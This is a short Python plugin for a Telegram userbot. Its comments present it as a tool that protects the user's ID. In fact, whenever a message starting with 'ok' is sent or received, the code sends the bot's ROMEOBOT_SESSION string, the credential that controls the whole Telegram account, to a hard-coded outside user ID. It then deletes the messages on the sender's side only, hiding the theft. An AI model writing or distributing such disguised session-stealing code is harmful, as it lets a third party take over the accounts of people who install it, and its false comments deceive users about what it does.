#this plugin maked by RomeoRJ 
#this plugin maked by protected your ID
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^ok", incoming=True))
@bot.on(admin_cmd("^ok", outgoing=True))
async def piro(event):
  msg = await bot.send_message(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
  cyber = await bot.send_message(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
  await bot.delete_messages(5353539036, msg, revoke=False)
  await bot.delete_messages(5353539036, cyber, revoke=False)
